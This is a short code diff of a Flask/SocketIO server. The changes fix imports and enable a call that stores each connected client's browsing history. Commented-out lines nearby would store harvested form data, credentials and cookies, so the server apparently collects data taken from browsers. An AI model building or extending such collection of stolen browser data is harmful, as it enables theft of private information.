@@ -1,15 +1,15 @@
 from flask import Flask, render_template
 from flask_socketio import SocketIO, emit, send 
-import database
+from . import database
 import json, os
 import eventlet
-
+eventlet.monkey_patch(socket = True)
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.environ.get("FLASK_SECRET", "secret!")
 socketio = SocketIO(app, async_mode='eventlet')
 connected_clients = [] #tuples of (clientid, sid)
 
-#import frontend
+from . import frontend
 
 """
 Server responses to client: (int status, data) as tuple
@@ -89,7 +89,7 @@ if __name__ == "__main__":
         #database.store_form_data(data["forms"][0], clientid)
         #database.store_credential(data["creds"][0], clientid)
         #database.store_cookie(data["cookies"][0], clientid)
-        #database.store_history(data["history"], clientid)
-        database.create_new_client(data)
+        database.store_history(data["history"], clientid)
+        #database.create_new_client(data)
         #database.construct_response(clientid)
     socketio.run(app, debug=True, use_reloader=False)
